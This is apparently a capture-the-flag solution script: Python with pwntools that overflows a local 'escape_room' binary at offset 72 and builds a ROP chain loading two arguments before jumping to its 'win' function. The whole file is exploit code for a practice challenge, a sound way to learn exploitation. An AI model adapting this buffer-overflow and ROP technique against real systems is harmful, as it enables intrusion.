#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./escape_room', checksec=False)

p = process(elf.path)
ret = 0x000000000040101a

offset = 72
arg1 = 0xdeadbeef
arg2 = 0xcafebabe

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]

payload = flat(
    b"A" * offset,
    p64(rdi),p64(arg1),
    p64(rsi),p64(arg2),
    p64(ret),p64(elf.sym.win)
)

p.recvuntil(b"keys?")
p.send(payload)
p.interactive()